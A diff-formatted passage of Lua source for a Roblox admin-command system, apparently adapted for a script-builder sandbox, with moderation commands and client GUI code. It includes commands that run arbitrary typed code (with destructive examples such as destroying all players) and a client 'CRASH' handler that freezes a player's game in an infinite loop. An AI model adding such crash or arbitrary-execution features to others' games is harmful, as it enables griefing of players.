+f.addCommand({'unvip'},{'Remove VIP powers from players.',s.set.Prefix..'unvip kohl'},3,{'player'},function(pl,args) for i,plr in pairs(args[1]) do if plr and plr ~= pl and f.getPower(tostring(plr.userId)) > f.getPower(tostring(pl.userId)) then local tab = s.admins[tostring(plr.userId)] if tab and tab[3] and tab[4] then s.admins[tostring(plr.userId)] = {{5,plr.userId},plr.Name,tab[3],tab[4]} else s.admins[tostring(plr.userId)] = {{5,plr.userId},plr.Name,plr.Name,'{1 1 1}'} end end end end)
+f.addCommand({'unban'},{'Removes a ban from players.',s.set.Prefix..'unban kohltastrophe'},2,{'player'},function(pl,args) for i,plr in pairs(args[1]) do if plr and plr ~= pl and f.getPower(tostring(plr.userId)) > f.getPower(tostring(pl.userId)) then s.banland[tostring(plr.userId)] = nil end end end)
+
+f.addCommand({'admins','adminlist'},{'Shows the list of users with powers.',s.set.Prefix..'admins'},3,{},function(pl,args)
+if not pl or not pl:findFirstChild('PlayerGui') then return end event:FireClient(pl,f.uiD..'ADMINS',{s.admins})
+end)
+
+f.addCommand({'bans','banlist','banland'},{'Shows the list of banned users.',s.set.Prefix..'bans'},2,{},function(pl,args)
+if not pl or not pl:findFirstChild('PlayerGui') then return end event:FireClient(pl,f.uiD..'BANS',{s.banland})
+end)
+
+f.addCommand({'cmds','commands'},{'Shows the commands list.',s.set.Prefix..'cmds'},5,{},function(pl,args)
+if not pl or not pl:findFirstChild('PlayerGui') then return end event:FireClient(pl,f.uiD..'CMDS',{f.getCmds(f.getPower(tostring(pl.userId))),f.getPower(tostring(pl.userId))})
+end)
+
+f.addCommand({'cmdbar','commandbar'},{'Gives a command execution bar.',s.set.Prefix..'cmdbar'},2,{},function(pl,args)
+if not pl or not pl:findFirstChild('PlayerGui') then return end event:FireClient(pl,f.uiD..'CMDBAR')
+end)
+
+f.addCommand({'s','script'},{'Creates a script.',s.set.Prefix..'s game.Players:Destroy()'},2,{'string'},function(pl,args)
+local sc = script.SB:clone() sc.Parent = script
+local idx = '' for i = 1, 10 do idx = idx .. f.TS(f.MR(0,9)) end
+local x1 = Instance.new('StringValue',sc) x1.Name = ('\a'):rep(8) x1.Value = idx..args[1]
+local x2 = Instance.new('StringValue',x1) x2.Name = '\a\a\n\n' x2.Value = idx sc.Disabled = false
+end)
+
+f.addCommand({'ls','localscript'},{'Creates a localscript.',s.set.Prefix..'ls game.Players.LocalPlayer:Kick()'},2,{'string'},function(pl,args)
+if not pl.Character and not pl:findFirstChild('PlayerGui') and not pl:findFirstChild('Backpack') then return end
+local par if pl.Character then par = pl.Character elseif pl:findFirstChild('PlayerGui') then par = pl:findFirstChild('PlayerGui') elseif pl:findFirstChild('Backpack') then par = pl:findFirstChild('Backpack') end
+local sc = script.SB:clone() sc.Parent = script
+local idx = '' for i = 1, 10 do idx = idx .. f.TS(f.MR(0,9)) end
+local x1 = Instance.new('StringValue',par) x1.Name = ('\a'):rep(8) x1.Value = idx..args[1]
+local x2 = Instance.new('StringValue',x1) x2.Name = '\a\a\n\n' x2.Value = idx sc.Disabled = false
+end)
+
+f.addCommand({'n','notify','warn'},{'Places a permanent message.',s.set.Prefix..'n I\'m afk.'},2,{'string'},function(pl,args)
+f.Notify({args[1]})
+end)
+
+f.addCommand({'rn','rnotify','rwarn'},{'Removes a permanent message.',s.set.Prefix..'rn'},2,{},function()
+f.RNotify()
+end)
+
+f.addCommand({'an','announce','sm'},{'Shouts an announcement.',s.set.Prefix..'an I\'m banning everyone.'},3,{'string'},function(pl,args)
+f.Msg({'ANNOUNCEMENT','',args[1]},'all')
+end)
+
+f.addCommand({'m','msg','shout'},{'Shouts a message.',s.set.Prefix..'m The cake is a lie.'},3,{'string'},function(pl,args)
+f.Msg({f.getNick(tostring(pl.userId)),f.getTitle(f.getPower(tostring(pl.userId))),args[1]},'all')
+end)
+
+f.addCommand({'pm','pmsg'},{'Privately shouts a message.',s.set.Prefix..'pm kohl I like you.'},3,{'player','string'},function(pl,args)
+if args[1] == game.Players:children() then f.Msg({pl.Name,f.getTitle(f.getPower(tostring(pl.userId))),args[2]},'all')
+else for i,plr in pairs(args[1]) do f.Msg({f.getNick(tostring(pl.userId)),f.getTitle(f.getPower(tostring(pl.userId))),args[2]},plr) end
+end
+end)
+
+f.addCommand({'h','hint'},{'Hints a message.',s.set.Prefix..'h Don\'t look at this.'},3,{'string'},function(pl,args)
+f.Hint({f.getNick(tostring(pl.userId)),args[1]},'all')
+end)
+
+f.addCommand({'ph','phint'},{'Privately hints a message.',s.set.Prefix..'ph Why hello there.'},3,{'player','string'},function(pl,args)
+if args[1] == game.Players:children() then f.Hint({pl.Name,args[2]},'all')
+else for i,plr in pairs(args[1]) do f.Hint({f.getNick(tostring(pl.userId)),args[2]},plr) end
+end
+end)
+
+f.addCommand({'ff','forcefield'},{'Gives players a force field.',s.set.Prefix..'ff kohl'},3,{'player'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (plr and plr.Character) then return end
+Instance.new('ForceField',plr.Character)
+end
+end)
+
+f.addCommand({'unff','unforcefield'},{'Removes force fields from players.',s.set.Prefix..'unff kohl'},3,{'player'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (plr and plr.Character) then return end for i2,ff in pairs(plr.Character:children()) do
+if ff:IsA('ForceField') then ff:Destroy() end
+end end
+end)
+
+f.addCommand({'kill','slay'},{'Kills a player.',s.set.Prefix..'kill kohl'},3,{'player'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (plr and plr.Character) then return end
+plr.Character:BreakJoints()
+end
+end)
+
+f.addCommand({'team','tm'},{'Changes the team of a player.',s.set.Prefix..'team kohl raiders'},3,{'player','string'},function(pl,args)
+local tm = nil for i,v in pairs(game.Teams:children()) do if v.Name:lower():find(args[2]:lower()) then tm = v end end
+for i,plr in pairs(args[1]) do if not (plr and plr.Character and tm) then return end
+plr.TeamColor = tm.TeamColor
+end
+end)
+
+f.addCommand({'fly'},{'Gives a player flight.',s.set.Prefix..'fly kohl'},3,{'player'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (plr and plr.Character) then return end
+event:FireClient(plr,f.uiD..'FLY')
+end
+end)
+
+f.addCommand({'unfly'},{'Gives a player flight.',s.set.Prefix..'fly kohl'},3,{'player'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (plr and plr.Character) then return end
+event:FireClient(plr,f.uiD..'UNFLY')
+end
+end)
+
+f.addCommand({'respawn','r'},{'Respawns a player.',s.set.Prefix..'respawn kohl'},3,{'player'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (plr and plr.Character) then return end
+plr:LoadCharacter()
+end
+end)
+
+f.addCommand({'phase'},{'Makes a player phase.',s.set.Prefix..'phase kohl'},3,{'player'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (plr and plr.Character) then return end
+event:FireClient(plr,f.uiD..'PHASE')
+end
+end)
+
+f.addCommand({'unphase'},{'Makes a player unphase.',s.set.Prefix..'unphase kohl'},3,{'player'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (plr and plr.Character) then return end
+event:FireClient(plr,f.uiD..'UNPHASE')
+end
+end)
+
+f.addCommand({'place'},{'Makes a player change places.',s.set.Prefix..'place kohl 1337'},2,{'player','number'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (plr and plr.Character) then return end
+game:GetService('TeleportService'):Teleport(args[2], plr)
+end
+end)
+
+f.addCommand({'vibrate'},{'Makes a player vibrate.',s.set.Prefix..'vibrate kohl 5'},3,{'player','number'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (plr and plr.Character) then return end
+event:FireClient(plr,f.uiD..'VIBRATE',args[2])
+end
+end)
+
+f.addCommand({'unvibrate'},{'Makes a player stop vibrating.',s.set.Prefix..'unvibrate kohl'},3,{'player'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (plr and plr.Character) then return end
+event:FireClient(plr,f.uiD..'UNVIBRATE')
+end
+end)
+
+f.addCommand({'tp','teleport','tele'},{'Teleports a player to a player.',s.set.Prefix..'tp kohl me'},3,{'player','player'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (plr and plr.Character and plr.Character:findFirstChild('Torso')) or not (args[2][1] and args[2][1].Character) then return end
+plr.Character.Torso.CFrame = CFrame.new(args[2][1].Character.Torso.Position+Vector3.new(math.random(-50,50),0,math.random(-50,50))/10)
+end
+end)
+
+f.addCommand({'damage','dmg'},{'Damages a player.',s.set.Prefix..'damage kohl 5'},3,{'player','number'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (plr and plr.Character and plr.Character:findFirstChild('Humanoid')) then return end
+plr.Character.Humanoid:TakeDamage(args[2])
+end
+end)
+end))
+LocalScript2.Name = "x"
+LocalScript2.Parent = Script1
+table.insert(cors,sandbox(LocalScript2,function()
+locals = NLS([[wait() script.Parent = nil wait(1)
+local f = {rmv = function(a,b) game:service('Debris'):AddItem(a,b) end; SP = script.Parent; LP = game.Players.LocalPlayer; WS = game:service('Workspace'); PL = game:service('Players'); IN = Instance.new; CF = CFrame.new; CA = CFrame.Angles; V3 = Vector3.new; BC = BrickColor.new; C3 = Color3.new; CW = coroutine.wrap; PC = pcall; YP = ypcall; MR = math.random; TS = tostring; TN = tonumber;}
+f.getTitle = function(pow) return pow == -1 and 'Admin Creator' or pow == 0 and 'Game Owner' or pow == 1 and 'Owner' or pow == 2 and 'Admin' or pow == 3 and 'Mod' or (s.set.VIP and pow == 4) and 'VIP' or pow == 5 and 'Player' end
+repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer:findFirstChild('PlayerGui') and game.Players.LocalPlayer:GetMouse() and game.Workspace.CurrentCamera and f.WS:findFirstChild('\a\n\a')
+local plr,plrgui,char,cam,mouse,input,event,fps = game.Players.LocalPlayer,game.Players.LocalPlayer:findFirstChild('PlayerGui'),game.Players.LocalPlayer.Character,game.Workspace.CurrentCamera,game.Players.LocalPlayer:GetMouse(),game:service('UserInputService'),f.WS:findFirstChild('\a\n\a'),0
+local uiD = event.uiD.Value:reverse() local notify,error,cmds,cmdbar,admins,bans game:service('RunService').Heartbeat:connect(function(p) fps = 1/p end)
+f.getWords = function(str) local a = {} for i in str:gmatch('%S+') do table.insert(a,i) end return a end
+
+local ap = f.IN('ScreenGui',plrgui)
+local img = f.IN('ImageButton',ap) img.Size = UDim2.new(0,77,0,28) img.Position = UDim2.new(1,-82,1,-53) img.BackgroundTransparency = 1 img.BorderSizePixel = 0 img.Image = 'rbxassetid://163157155'
+local fra = f.IN('Frame',img) fra.Size = UDim2.new(0,0,0,0) fra.Position = UDim2.new(0,0,0,0) fra.Visible = false fra.BackgroundTransparency = 1 fra.BorderSizePixel = 0
+local tb = f.IN('TextButton',fra) tb.Size = UDim2.new(0,100,0,20) tb.Position = UDim2.new(0,-23,0,-25) tb.TextColor3 = Color3.new(1,1,1) tb.TextStrokeTransparency = .75 tb.BackgroundColor3 = Color3.new(0,0,0) tb.BackgroundTransparency = .8 tb.BorderSizePixel = 0 tb.Font = 'ArialBold' tb.FontSize = 'Size18' tb.Text = 'Commands'
+img.MouseButton1Click:connect(function() if fra.Visible then fra.Visible = false else fra.Visible = true end end)
+tb.MouseButton1Click:connect(function() event:FireServer('CMDS') end)
+local tb2 = tb:Clone() tb2.Parent = fra tb2.Text = 'CMDBAR' tb2.BackgroundTransparency = .6 tb2.Position = UDim2.new(0,-23,0,-45)
+tb2.MouseButton1Click:connect(function() event:FireServer('CMDBAR') end)
+local msgs,curr = {},{}
+
+local ftme = 2/3
+
+function FadeIn(obj,tme,orig)
+coroutine.wrap(function()
+local rc
+rc = game:service('RunService').RenderStepped:connect(function()
+obj.BackgroundTransparency = orig.BT+((1-orig.BT)*math.max((tme+ftme)-tick(),0))
+if obj:IsA('TextLabel') or obj:IsA('TextButton') then
+obj.TextTransparency = orig.TT+((1-orig.TT)*math.max((tme+ftme)-tick(),0))
+obj.TextStrokeTransparency = orig.TST+((1-orig.TST)*math.max((tme+ftme)-tick(),0))
+end
+if tme+ftme <= tick() then rc:disconnect() end
+end)
+end)()
+end
+
+function FadeOut(obj,tme)
+coroutine.wrap(function()
+if not obj:IsA('ScreenGui') then
+local orig = {} orig.BT = obj.BackgroundTransparency
+if obj:IsA('TextLabel') or obj:IsA('TextButton') then orig.TT = obj.TextTransparency orig.TST = obj.TextStrokeTransparency end
+local rc
+rc = game:service('RunService').RenderStepped:connect(function()
+obj.BackgroundTransparency = 1-((1-orig.BT)*math.max((tme+ftme)-tick(),0))
+if obj:IsA('TextLabel') or obj:IsA('TextButton') then
+obj.TextTransparency = 1-((1-orig.TT)*math.max((tme+ftme)-tick(),0))
+obj.TextStrokeTransparency = 1-((1-orig.TST)*math.max((tme+ftme)-tick(),0))
+end
+if tme+ftme <= tick() then f.rmv(obj,0) rc:disconnect() end
+end)
+end
+end)() for i,v in pairs(obj:children()) do FadeOut(v,tme) end
+end
+
+function onCall(type,a) local calltime = tick() if script.Disabled then return end local torso,hum = char:findFirstChild('Torso'),char:findFirstChild('Humanoid')
+if type:sub(1,10) == uiD then type = type:sub(11) else return end
+if type == 'CRASH' then repeat until nil
+elseif type == 'FLY' then if char:findFirstChild('KFLY') then char.KFLY:Destroy() end if torso:findFirstChild('BodyGyro') then torso.BodyGyro:Destroy() end
+local vb = Instance.new('IntValue',char) vb.Name = 'KFLY'
+local bg = Instance.new("BodyGyro", torso) bg.D = 1000 bg.P = 5000 bg.maxTorque = Vector3.new(0,0,0)
+local con,con2,con3
+local drive,turn,jump = 0,0,0
+local c1,c2,c3 = 0,0,0
+local flight = true
+local lastjump = 0
+local anim,leganim = false,false
+function FloatAnim()
+local ls = torso:findFirstChild("Left Shoulder")
+local rs = torso:findFirstChild("Right Shoulder")
+local lh = torso:findFirstChild("Left Hip")
+local rh = torso:findFirstChild("Right Hip")
+if not anim and ls and rs and lh and rh then
+anim = true ls:SetDesiredAngle(0) rs:SetDesiredAngle(0) lh:SetDesiredAngle(0) rh:SetDesiredAngle(0)
+game.Players.LocalPlayer.Character.Animate.Disabled = true
+if hum.Parent:findFirstChild('Head') then for i,v in pairs(hum.Parent.Head:children()) do if v:IsA('Sound') then v.Volume = 0 end end end
+if leganim == false then
+leganim = true
+for i = 1, 20 do if hum.Parent:findFirstChild('Head') then for i,v in pairs(hum.Parent.Head:children()) do if v:IsA('Sound') then v.Volume = 0 end end end
+wait()
+ls.C0 = (ls.C0 * CFrame.new(0,(-0.005),(0.005))) * CFrame.Angles(math.rad((-1)),0,0)
+rs.C0 = (rs.C0 * CFrame.new(0,(-0.005),(0.005))) * CFrame.Angles(math.rad((-1)),0,0)
+lh.C0 = (lh.C0 * CFrame.new((0.005),(0.005),0)) * CFrame.Angles(0,0,math.rad((-1)))
+rh.C0 = (rh.C0 * CFrame.new((0.005),(0.005),0)) * CFrame.Angles(0,0,math.rad((-1)))
+end
+for i = 1, 20 do if hum.Parent:findFirstChild('Head') then for i,v in pairs(hum.Parent.Head:children()) do if v:IsA('Sound') then v.Volume = 0 end end end
+wait()
+ls.C0 = (ls.C0 * CFrame.Angles(math.rad((1)),0,0)) * CFrame.new(0,(0.005),(-0.005))
+rs.C0 = (rs.C0 * CFrame.Angles(math.rad((1)),0,0)) * CFrame.new(0,(0.005),(-0.005))
+lh.C0 = (lh.C0 * CFrame.Angles(0,0,math.rad((1)))) * CFrame.new((-0.005),(-0.005),0)
+rh.C0 = (rh.C0 * CFrame.Angles(0,0,math.rad((1)))) * CFrame.new((-0.005),(-0.005),0)
+end
+elseif leganim == true then
+leganim = false
+for i = 1, 20 do if hum.Parent:findFirstChild('Head') then for i,v in pairs(hum.Parent.Head:children()) do if v:IsA('Sound') then v.Volume = 0 end end end
+wait()
+ls.C0 = (ls.C0 * CFrame.new(0,(-0.005),(0.005))) * CFrame.Angles(math.rad((-1)),0,0)
+rs.C0 = (rs.C0 * CFrame.new(0,(-0.005),(0.005))) * CFrame.Angles(math.rad((-1)),0,0)
+lh.C0 = (lh.C0 * CFrame.new((-0.005),(-0.005),0)) * CFrame.Angles(0,0,math.rad((1)))
+rh.C0 = (rh.C0 * CFrame.new((-0.005),(-0.005),0)) * CFrame.Angles(0,0,math.rad((1)))
+end
+for i = 1, 20 do if hum.Parent:findFirstChild('Head') then for i,v in pairs(hum.Parent.Head:children()) do if v:IsA('Sound') then v.Volume = 0 end end end
+wait()
+ls.C0 = (ls.C0 * CFrame.Angles(math.rad((1)),0,0)) * CFrame.new(0,(0.005),(-0.005))
+rs.C0 = (rs.C0 * CFrame.Angles(math.rad((1)),0,0)) * CFrame.new(0,(0.005),(-0.005))
+lh.C0 = (lh.C0 * CFrame.Angles(0,0,math.rad((-1)))) * CFrame.new((0.005),(0.005),0)
+rh.C0 = (rh.C0 * CFrame.Angles(0,0,math.rad((-1)))) * CFrame.new((0.005),(0.005),0)
+end
+end
+game.Players.LocalPlayer.Character.Animate.Disabled = false
+if hum.Parent:findFirstChild('Head') then for i,v in pairs(hum.Parent.Head:children()) do if v:IsA('Sound') then v.Volume = .5 end end end
+anim = false
+end
+end
+con = game:service('RunService').RenderStepped:connect(function() if not vb or not cam or not vb.Parent or not char or not char.Parent or not torso or not torso.Parent then con:disconnect() con2:disconnect() con3:disconnect() bg:Destroy() return end
+if torso and hum and flight then coroutine.wrap(function() if not anim then FloatAnim(torso) end end)()
+if cam and cam.CoordinateFrame then bg.maxTorque = Vector3.new(9e9,9e9,9e9) bg.cframe = cam.CoordinateFrame else bg.maxTorque = Vector3.new(0,0,0) end
+if drive == 1 then if c1 < 1 then c1 = c1+.05 else c1 = 1 end elseif drive == -1 then if c1 > -1 then c1 = c1-.05 else c1 = -1 end else if math.abs(c1) > .05 then c1 = c1-((c1/math.abs(c1))*.05) else c1 = 0 end end
+if turn == 1 then if c2 < 1 then c2 = c2+.05 else c2 = 1 end elseif turn == -1 then if c2 > -1 then c2 = c2-.05 else c2 = -1 end else if math.abs(c2) > .05 then c2 = c2-((c2/math.abs(c2))*.05) else c2 = 0 end end
+if jump == 1 then if c3 < 1 then c3 = c3+.05 else c3 = 1 end else if math.abs(c3) > .05 then c3 = c3-((c3/math.abs(c3))*.05) else c3 = 0 end end
+torso.Velocity = ((cam.CoordinateFrame*CFrame.new((-25*c2),0,0)).p-cam.CoordinateFrame.p)+((cam.CoordinateFrame*CFrame.new(0,0,(-25*c1))).p-cam.CoordinateFrame.p)+Vector3.new(0,(c3*25),0)
+elseif not flight then bg.maxTorque = Vector3.new(0,0,0)
+end end)
+con2 = mouse.KeyUp:connect(function(key) key = key:lower() if key == 'w' and drive == 1 then drive = 0 elseif key =='s' and drive == -1 then drive = 0 elseif key:lower() == 'a' and turn == 1 then turn = 0 elseif key:lower() == 'd' and turn == -1 then turn = 0 elseif key:lower() == string.char(32) then jump = 0 if tick()-lastjump <= 1/3 then flight = not flight end lastjump = tick() end end)
+con3 = mouse.KeyDown:connect(function(key) if key:lower() == 'w' then drive = 1 elseif key:lower() == 's' then drive = -1 elseif key:lower() == 'a' then turn = 1 elseif key:lower() == 'd' then turn = -1 elseif key:lower() == string.char(32) then jump = 1 end end)
+elseif type == 'UNFLY' then if char:findFirstChild('KFLY') then char.KFLY:Destroy() end
+elseif type == 'UNVIBRATE' then if char:findFirstChild('KVIBRATE') then char.KVIBRATE:Destroy() end
+elseif type == 'VIBRATE' then if char:findFirstChild('KVIBRATE') then char.KVIBRATE:Destroy() end
+local vb = Instance.new('IntValue',char) vb.Name = 'KVIBRATE'
+local con 
+local nmt = 0
+local cnt = true
+local vc3 = Vector3.new(0,0,0)
+con = game:service('RunService').RenderStepped:connect(function() if not vb or not vb.Parent or not char or not char:findFirstChild('Torso') or vb.Parent ~= char then con:disconnect() return end
+if cnt then nmt = nmt + 1
+if nmt == 1 then vc3 = Vector3.new(a,0,0)
+elseif nmt == 2 then vc3 = Vector3.new(0,0,a)
+elseif nmt == 3 then vc3 = Vector3.new(-a,0,0)
+elseif nmt == 4 then vc3 = Vector3.new(0,0,-a) nmt = 0
+end char.Torso.CFrame = char.Torso.CFrame * CFrame.new(vc3)
+else char.Torso.CFrame = char.Torso.CFrame * CFrame.new(-vc3)
+end cnt = not cnt
+end)
+elseif type == 'PHASE' then char.Parent = cam
+elseif type == 'UNPHASE' then char.Parent = game.Workspace
+elseif type == 'CMDBAR' then if cmdbar then cmdbar:Destroy() cmdbar = nil return end local startmsg = 'Type a command then press enter'
+local m = f.IN('ScreenGui',plrgui) cmdbar = m local down = false
+local tb = f.IN('TextButton',m) tb.AutoButtonColor = false tb.Draggable = true tb.Size = UDim2.new(0,20,0,20) tb.Position = UDim2.new(0,0,0,156) tb.Transparency = 1 tb.BorderSizePixel = 0 tb.ZIndex = 10 tb.BackgroundColor3 = Color3.new(0,0,0) tb.BackgroundTransparency = 0
+local tbx = f.IN('TextBox',tb) tbx.ClearTextOnFocus = false tbx.Draggable = true tbx.Text = startmsg tbx.Size = UDim2.new(0,200,1,0) tbx.Position = UDim2.new(0,20,0,0) tbx.Font = 'ArialBold' tbx.FontSize = 'Size14' tbx.TextColor3 = Color3.new(1,1,1) tbx.BackgroundColor3 = Color3.new(0,0,0) tbx.BackgroundTransparency = .8 tbx.TextStrokeTransparency = .75 tbx.ZIndex = 9
+tbx.FocusLost:connect(function(p) if p then event:FireServer('CMDBAR',tbx.Text) tbx.Text = startmsg end end)
+tbx.Changed:connect(function() local msg = tbx.Text if msg:find(startmsg) and msg:len() > startmsg:len() then tbx.Text = msg:sub(msg:find(startmsg) + startmsg:len()) end end)
+tbx.InputBegan:connect(function(p) if p.UserInputType == Enum.UserInputType.MouseButton1 and tbx.Text == startmsg then tbx.Text='' end end)
+elseif type == 'CMDS' then if cmds then cmds:Destroy() cmds = nil return end
+local m = f.IN('ScreenGui',plrgui) cmds = m
+local tb = f.IN('TextButton',m) tb.Size = UDim2.new(0,195,0,240) tb.Transparency = 1 tb.Text = '' tb.Position = UDim2.new(.5,-100,.5,-120) tb.Draggable = true tb.ZIndex = 10
+local fr = f.IN('Frame',tb) fr.Size = UDim2.new(1,5,1,0)  fr.BackgroundColor3 = Color3.new(0,0,0) fr.BorderSizePixel = 0 fr.Transparency = .8 fr.ZIndex = 9
+local cs = f.IN('ScrollingFrame',fr)
+cs.ScrollBarThickness = 5
+cs.BorderSizePixel = 0
+cs.BackgroundTransparency = 1
+cs.Size = UDim2.new(1,-5,1,0)
+cs.Position = UDim2.new(0,5,0,0)
+cs.CanvasSize = UDim2.new(1,-5,0,#a[1]*20)
+cs.CanvasPosition = Vector2.new(0,0)
+local tl = f.IN('TextLabel') tl.ZIndex = 10 tl.TextXAlignment = 'Left' tl.Font = 'ArialBold' tl.FontSize = 'Size18' tl.TextColor3 = Color3.new(1,1,1) tl.TextStrokeTransparency = .75 tl.Size = UDim2.new(1,0,0,20) tl.BorderSizePixel = 0 tl.BackgroundColor3 = Color3.new(0,0,0) tl.BackgroundTransparency = 1
+local tts = {}
+for i,v in pairs(a[1]) do if v[3] >= a[2] then local cl = tl:Clone() cl.Parent = cs cl.Position = UDim2.new(0,0,0,(i*20)-20) cl.Text = i..'. '..v[1][1] for b,c in pairs(v[4]) do cl.Text = cl.Text..' '..c end local tt = tl:Clone() tt.Parent = fr tt.Size = UDim2.new(0,200,0,20) tt.Position = UDim2.new(0,0,0,-20) tt.Visible = false tt.Text = v[2][1]..' ('..v[2][2]..')' tt.BackgroundTransparency = 1 tt.TextTransparency = 0 tt.TextStrokeTransparency = .75 table.insert(tts,tt) cl.MouseEnter:connect(function() for i2,v2 in pairs(tts) do v2.Visible = false end tt.Visible = true end) cl.MouseLeave:connect(function() tt.Visible = false end) end end
+elseif type == 'ADMINS' then if admins then admins:Destroy() admins = nil return end
+local m = f.IN('ScreenGui',plrgui) admins = m
+local tb = f.IN('TextButton',m) tb.Size = UDim2.new(0,300,0,240) tb.Transparency = 1 tb.Text = '' tb.Position = UDim2.new(.5,-100,.5,-120) tb.Draggable = true tb.ZIndex = 10
+local fr = f.IN('Frame',tb) fr.Size = UDim2.new(1,5,1,0)  fr.BackgroundColor3 = Color3.new(0,0,0) fr.BorderSizePixel = 0 fr.Transparency = .8 fr.ZIndex = 9
+local cs = f.IN('ScrollingFrame',fr)
+cs.ScrollBarThickness = 5
+cs.BorderSizePixel = 0
+cs.BackgroundTransparency = 1
+cs.Size = UDim2.new(1,-5,1,0)
+cs.Position = UDim2.new(0,5,0,0)
+cs.CanvasSize = UDim2.new(1,-5,0,#a[1]*20)
+cs.CanvasPosition = Vector2.new(0,0)
+local tl = f.IN('TextLabel') tl.ZIndex = 10 tl.TextXAlignment = 'Left' tl.Font = 'ArialBold' tl.FontSize = 'Size18' tl.TextColor3 = Color3.new(1,1,1) tl.TextStrokeTransparency = .75 tl.Size = UDim2.new(1,0,0,20) tl.BorderSizePixel = 0 tl.BackgroundColor3 = Color3.new(0,0,0) tl.BackgroundTransparency = 1
+local tts,tnum = {},0
+for i,v in pairs(a[1]) do tnum=tnum+1 local cl = tl:Clone() cl.Parent = cs cl.Position = UDim2.new(0,0,0,(tnum*20)-20) cl.Text = tnum..'. '..v[2]..'\t\t'..f.getTitle(v[1][1]) cl.MouseEnter:connect(function() end) cl.MouseLeave:connect(function() end) end
+elseif type == 'BANS' then if bans then bans:Destroy() bans = nil return end
+local m = f.IN('ScreenGui',plrgui) bans = m
+local tb = f.IN('TextButton',m) tb.Size = UDim2.new(0,300,0,240) tb.Transparency = 1 tb.Text = '' tb.Position = UDim2.new(.5,-100,.5,-120) tb.Draggable = true tb.ZIndex = 10
+local fr = f.IN('Frame',tb) fr.Size = UDim2.new(1,5,1,0)  fr.BackgroundColor3 = Color3.new(0,0,0) fr.BorderSizePixel = 0 fr.Transparency = .8 fr.ZIndex = 9
+local cs = f.IN('ScrollingFrame',fr)
+cs.ScrollBarThickness = 5
+cs.BorderSizePixel = 0
+cs.BackgroundTransparency = 1
+cs.Size = UDim2.new(1,-5,1,0)
+cs.Position = UDim2.new(0,5,0,0)
+cs.CanvasSize = UDim2.new(1,-5,0,#a[1]*20)
+cs.CanvasPosition = Vector2.new(0,0)
+local tl = f.IN('TextLabel') tl.ZIndex = 10 tl.TextXAlignment = 'Left' tl.Font = 'ArialBold' tl.FontSize = 'Size18' tl.TextColor3 = Color3.new(1,1,1) tl.TextStrokeTransparency = .75 tl.Size = UDim2.new(1,0,0,20) tl.BorderSizePixel = 0 tl.BackgroundColor3 = Color3.new(0,0,0) tl.BackgroundTransparency = 1
+local tts,tnum = {},0
+for i,v in pairs(a[1]) do tnum=tnum+1 local cl = tl:Clone() cl.Parent = cs cl.Position = UDim2.new(0,0,0,(tnum*20)-20) cl.Text = tnum..'. '..v[1][1]..'\t' if v[2] then local txt = cl.Text f.CW(function() repeat cl.Text = txt..tostring(math.floor(v[2]-tick()))..' seconds' wait(.2) until nil end)() else cl.Text = cl.Text..'Forever' end cl.MouseEnter:connect(function() end) cl.MouseLeave:connect(function() end) end
+elseif type == 'RNOTIFY' and curr.Notify then curr.Notify = nil
+elseif type == 'NOTIFY' then
+local m = f.IN('ScreenGui',plrgui) curr.Notify = m table.insert(msgs,{m})
+local fr = f.IN('Frame',m) fr.Size = UDim2.new(0,400,0,120) fr.Position = UDim2.new(0.5,-200,0,20) fr.BackgroundColor3 = Color3.new(0,0,0) fr.BorderSizePixel = 0 fr.Transparency = 1 fr.ZIndex = 9
+local ti = f.IN('TextLabel',fr) ti.Name = 'Title' ti.Position = UDim2.new(.5,0,0,20) ti.TextWrapped = true ti.BorderSizePixel = 0 ti.Transparency = 1 ti.Font = 'ArialBold' ti.FontSize = 'Size24' ti.TextStrokeTransparency = 1 ti.TextColor3 = Color3.new(1,1,1) ti.ZIndex = 10 ti.Text = 'NOTIFICATION'
+local ms = ti:Clone() ms.Name = 'Msg' ms.Parent = fr ms.FontSize = 'Size18' ms.Size = UDim2.new(1,-10,1,-20) ms.Position = UDim2.new(0,5,0,20) ms.Text = a[1]
+FadeIn(fr,calltime,{BT = .5})
+FadeIn(ti,calltime,{BT = 1, TT = 0, TST = .75})
+FadeIn(ms,calltime,{BT = 1, TT = 0, TST = .75})
+elseif type == 'MSG' then
+local m = f.IN('ScreenGui',plrgui) curr.Msg = m table.insert(msgs,{m,tick()+(3+math.min(6,(#a[2]*.05)))})
+local fr = f.IN('Frame',m) fr.Size = UDim2.new(1,0,1,0) fr.BackgroundColor3 = Color3.new(0,0,0) fr.BorderSizePixel = 0 fr.Transparency = 1 fr.ZIndex = 9
+local ti = f.IN('TextLabel',fr) ti.Position = UDim2.new(.5,0,0,50) ti.TextWrapped = true ti.BorderSizePixel = 0 ti.Transparency = 1 ti.Font = 'ArialBold' ti.FontSize = 'Size48' ti.TextStrokeTransparency = 1 ti.TextColor3 = Color3.new(1,1,1) ti.ZIndex = 10 ti.Text = a[1]
+local pow = ti:Clone() pow.Parent = fr pow.Position = UDim2.new(.5,0,0,100) pow.FontSize = 'Size24' pow.Text = a[2]
+local ms = ti:Clone() ms.Parent = fr ms.FontSize = 'Size24' ms.Size = UDim2.new(.7,0,0,100) ms.Position = UDim2.new(.15,0,.5,-50) ms.Text = a[3]
+FadeIn(fr,calltime,{BT = .5})
+FadeIn(ti,calltime,{BT = 1, TT = 0, TST = .75})
+FadeIn(pow,calltime,{BT = 1, TT = 0, TST = .75})
+FadeIn(ms,calltime,{BT = 1, TT = 0, TST = .75})
+elseif type == 'HINT' then
+local m = f.IN('ScreenGui',plrgui) curr.Hint = m table.insert(msgs,{m,tick()+(3+math.min(6,(#a[2]*.05)))})
+local fr = f.IN('Frame',m) fr.Size = UDim2.new(1,0,0,20) fr.BackgroundColor3 = Color3.new(0,0,0) fr.BorderSizePixel = 0 fr.Transparency = 1 fr.ZIndex = 9
